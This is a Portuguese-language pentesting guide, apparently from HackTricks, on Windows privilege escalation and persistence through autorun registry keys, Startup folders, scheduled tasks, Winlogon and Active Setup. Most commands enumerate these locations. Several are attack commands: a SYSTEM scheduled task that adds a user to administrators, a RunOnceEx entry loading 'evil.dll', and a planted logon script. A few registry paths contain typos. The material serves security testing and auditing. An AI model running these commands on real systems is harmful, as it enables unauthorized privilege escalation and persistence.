# Escalada de Privilégios com Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** pode ser usado para executar programas na **inicialização**. Veja quais binários estão programados para serem executados na inicialização com:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Tarefas Agendadas

**Tasks** podem ser agendadas para serem executadas com **determinada frequência**. Veja quais binários estão agendados para serem executados com:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Pastas

Todos os binários localizados nas **pastas Startup serão executados na inicialização**. As pastas startup comuns são as listadas a seguir, mas a pasta startup é indicada no registro. [Leia isto para aprender onde.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Vulnerabilidades de *path traversal* na extração de arquivos comprimidos (como a explorada no WinRAR antes da 7.13 – CVE-2025-8088) podem ser usadas para **depositar payloads diretamente dentro dessas pastas Startup durante a descompressão**, resultando em execução de código no próximo logon do usuário. Para um aprofundamento nessa técnica, veja:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): A entrada de registry **Wow6432Node** indica que você está executando uma versão 64-bit do Windows. O sistema operacional usa essa chave para exibir uma visualização separada de HKEY_LOCAL_MACHINE\SOFTWARE para aplicativos 32-bit que rodam em versões 64-bit do Windows.

### Runs

**Comumente conhecidas** chaves AutoRun do registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

As chaves de registry conhecidas como **Run** e **RunOnce** são projetadas para executar programas automaticamente sempre que um usuário faz login no sistema. A linha de comando atribuída como valor de dados de uma chave é limitada a 260 caracteres ou menos.

**Service runs** (podem controlar a inicialização automática de services durante o boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

No Windows Vista e versões posteriores, as chaves de registry **Run** e **RunOnce** não são geradas automaticamente. As entradas nessas chaves podem iniciar programas diretamente ou especificá-los como dependências. Por exemplo, para carregar um arquivo DLL no logon, pode-se usar a chave de registry **RunOnceEx** junto com uma chave "Depend". Isso é demonstrado ao adicionar uma entrada de registry para executar "C:\temp\evil.dll" durante a inicialização do sistema:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Se você puder escrever dentro de qualquer uma das chaves de registry mencionadas em **HKLM**, você pode escalar privilégios quando um usuário diferente fizer login.

> [!TIP]
> **Exploit 2**: Se você puder sobrescrever qualquer um dos binaries indicados em qualquer uma das chaves de registry dentro de **HKLM**, você pode modificar esse binary com uma backdoor quando um usuário diferente fizer login e escalar privilégios.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Shortcuts colocados na pasta **Startup** irão acionar automaticamente serviços ou aplicações para serem iniciados durante o logon do usuário ou a reinicialização do sistema. A localização da pasta **Startup** é definida no registry tanto para o escopo de **Local Machine** quanto de **Current User**. Isso significa que qualquer shortcut adicionado a esses locais **Startup** especificados garantirá que o serviço ou programa vinculado seja iniciado após o processo de logon ou reboot, tornando isso um método direto para agendar programas para serem executados automaticamente.

> [!TIP]
> Se você conseguir sobrescrever qualquer \[User] Shell Folder sob **HKLM**, você poderá apontá-lo para uma pasta controlada por você e colocar uma backdoor que será executada sempre que um usuário fizer login no sistema, escalando privilégios.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Este valor de registro por usuário pode apontar para um script ou comando que é executado quando esse usuário faz logon. Ele é principalmente uma primitiva de **persistence** porque só é executado no contexto do usuário afetado, mas ainda vale a pena verificar durante post-exploitation e revisões de autoruns.

> [!TIP]
> Se você conseguir escrever esse valor para o usuário atual, poderá disparar a execução novamente no próximo logon interativo sem precisar de privilégios de admin. Se conseguir escrevê-lo para outro hive de usuário, poderá obter code execution quando esse usuário fizer logon.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notas:

- Prefira paths completos para arquivos `.bat`, `.cmd`, `.ps1` ou outros launcher files já legíveis pelo usuário alvo.
- Isso persiste após logoff/reboot até que o valor seja removido.
- Diferente de `HKLM\...\Run`, isso não concede elevation por si só; é persistence em escopo de usuário.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Normalmente, a chave **Userinit** é definida como **userinit.exe**. No entanto, se essa chave for modificada, o executável especificado também será iniciado pelo **Winlogon** ao fazer logon do usuário. Da mesma forma, a chave **Shell** é destinada a apontar para **explorer.exe**, que é o shell padrão do Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Se você puder sobrescrever o valor do registry ou o binary, você conseguirá escalar privilégios.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Verifique a chave **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Alterando o Prompt de Comando do Safe Mode

No Windows Registry em `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, há um valor **`AlternateShell`** definido por padrão como `cmd.exe`. Isso significa que, quando você escolhe "Safe Mode with Command Prompt" durante a inicialização (pressionando F8), `cmd.exe` é usado. Mas é possível configurar seu computador para iniciar automaticamente nesse modo sem precisar pressionar F8 e selecioná-lo manualmente.

Passos para criar uma opção de boot para iniciar automaticamente em "Safe Mode with Command Prompt":

1. Altere os atributos do arquivo `boot.ini` para remover os flags de somente leitura, sistema e oculto: `attrib c:\boot.ini -r -s -h`
2. Abra `boot.ini` para edição.
3. Insira uma linha como: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Salve as alterações em `boot.ini`.
5. Reaplique os atributos originais do arquivo: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Alterar a chave de registry **AlternateShell** permite configurar um command shell personalizado, potencialmente para acesso não autorizado.
- **Exploit 2 (PATH Write Permissions):** Ter permissões de escrita em qualquer parte da variável de sistema **PATH**, especialmente antes de `C:\Windows\system32`, permite executar um `cmd.exe` personalizado, que pode ser uma backdoor se o sistema for iniciado em Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Ter acesso de escrita em `boot.ini` permite iniciar automaticamente em Safe Mode, facilitando acesso não autorizado no próximo reboot.

Para verificar a configuração atual de **AlternateShell**, use estes comandos:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup é um recurso no Windows que **se inicia antes que o ambiente da área de trabalho seja totalmente carregado**. Ele prioriza a execução de certos comandos, que devem ser concluídos antes que o logon do usuário prossiga. Esse processo ocorre até mesmo antes de outras entradas de inicialização, como as das seções do registro Run ou RunOnce, serem acionadas.

Active Setup é gerenciado por meio das seguintes chaves do registro:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Dentro dessas chaves, existem várias subchaves, cada uma correspondente a um componente específico. Os valores de chave de interesse particular incluem:

- **IsInstalled:**
- `0` indica que o comando do componente não será executado.
- `1` significa que o comando será executado uma vez para cada usuário, que é o comportamento padrão se o valor `IsInstalled` estiver ausente.
- **StubPath:** Define o comando a ser executado pelo Active Setup. Pode ser qualquer linha de comando válida, como abrir `notepad`.

**Security Insights:**

- Modificar ou gravar em uma chave onde **`IsInstalled`** está definido como `"1"` com um **`StubPath`** específico pode levar à execução não autorizada de comandos, potencialmente para privilege escalation.
- Alterar o arquivo binário referenciado em qualquer valor **`StubPath`** também pode resultar em privilege escalation, com permissões suficientes.

Para inspecionar as configurações de **`StubPath`** em todos os componentes do Active Setup, estes comandos podem ser usados:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) são módulos DLL que adicionam recursos extras ao Microsoft Internet Explorer. Eles são carregados no Internet Explorer e no Windows Explorer a cada inicialização. No entanto, sua execução pode ser bloqueada ao definir a chave **NoExplorer** como 1, impedindo que sejam carregados com instâncias do Windows Explorer.

BHOs são compatíveis com o Windows 10 por meio do Internet Explorer 11, mas não são suportados no Microsoft Edge, o navegador padrão nas versões mais recentes do Windows.

Para explorar BHOs registrados em um sistema, você pode inspecionar as seguintes chaves do registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Cada BHO é representado por seu **CLSID** no registro, servindo como um identificador único. Informações detalhadas sobre cada CLSID podem ser encontradas em `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Para consultar BHOs no registro, estes comandos podem ser utilizados:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Note that the registry will contain 1 new registry per each dll and it will be represented by the **CLSID**. You can find the CLSID info in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Comando de Abertura

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opções de Execução de Arquivo de Imagem
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Note que todos os locais onde você pode encontrar autoruns já são **already searched by**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). However, para uma **more comprehensive list of auto-executed** file você pode usar [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)from systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Mais

**Encontre mais Autoruns como registries em** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Referências

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
